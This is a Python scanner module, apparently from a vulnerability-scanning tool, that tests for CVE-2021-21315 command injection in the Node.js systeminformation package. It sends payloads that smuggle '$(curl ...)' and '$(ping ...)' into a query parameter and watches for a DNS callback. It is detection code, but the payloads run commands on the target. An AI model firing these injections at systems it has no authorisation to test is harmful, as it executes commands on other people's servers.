#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

cve_2021_21315_payloads = [
    {'path': 'api/getServices?name[]=$(curl DNSDOMAIN)'},
    {'path': 'api/getServices?name[]=$(ping -c 4 DNSDOMAIN)'},
    {'path': 'api/getServices?name[]=$(ping DNSDOMAIN)'},
    {'path': 'getServices?name[]=$(curl DNSDOMAIN)'},
    {'path': 'getServices?name[]=$(ping -c 4 DNSDOMAIN)'},
    {'path': 'getServices?name[]=$(ping DNSDOMAIN)'}
]

def cve_2021_21315_scan(clients):
    ''' Node.js库中的systeminformation软件包中存在一个命令注入漏洞, 
        攻击者可以通过在未经过滤的参数中注入Payload来执行系统命令
    '''
    client = clients.get('reqClient')
    sessid = 'ea16de03573ce0c2f731fa40de93ecd7'

    vul_info = {
        'app_name': 'Node.js',
        'vul_type': 'RCE',
        'vul_id': 'CVE-2021-21315',
    }

    for payload in cve_2021_21315_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path'].replace('DNSDOMAIN', dns_domain)

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)
        if (dns.result(md, sessid)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
